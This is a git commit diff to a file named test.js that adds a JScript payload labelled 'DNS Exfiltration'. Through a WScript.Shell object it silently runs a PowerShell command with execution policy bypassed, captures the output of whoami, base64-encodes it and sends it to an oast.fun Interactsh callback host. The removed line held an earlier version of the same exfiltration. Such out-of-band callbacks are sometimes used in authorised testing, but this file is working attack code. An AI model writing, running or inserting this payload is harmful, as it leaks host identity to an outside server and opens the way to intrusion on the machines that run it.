892603aafafea9e3b769e96e1d239371a28b29b7
cantdothis2 <muhamedtafech202@gmail.com>
2025-11-01 04:29:20 +1100

    Update test.js

--- test.js
+++ test.js
@@ -1,4 +1,5 @@
-// DNS Exfiltration - whoami via PowerShell
-var cmd = 'powershell -nop -exec bypass -c "whoami | Out-File -Encoding ascii C:\\temp\\whoami.txt; $content = Get-Content C:\\temp\\whoami.txt; fetch(\\'http:rnjfqzizxajevsjjzcfew5oiup9b1ok72.oast.fun/\\' + $content)"';
+// DNS Exfiltration - whoami via PowerShell + Interactsh
 var shell = new ActiveXObject("WScript.Shell");
+var cmd = 'powershell -nop -exec bypass -c "whoami | % { $_.Replace(\"\\\"\", \"\") } | Out-File -Encoding ascii C:\\temp\\whoami.txt; $content = Get-Content C:\\temp\\whoami.txt -Raw; $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($content)); $url = ''http://rnjfqzizxajevsjjzcfew5oiup9b1ok72.oast.fun/'' + $encoded; Invoke-WebRequest -Uri $url -UseBasicParsing"';
+
 shell.Run(cmd, 0, false);
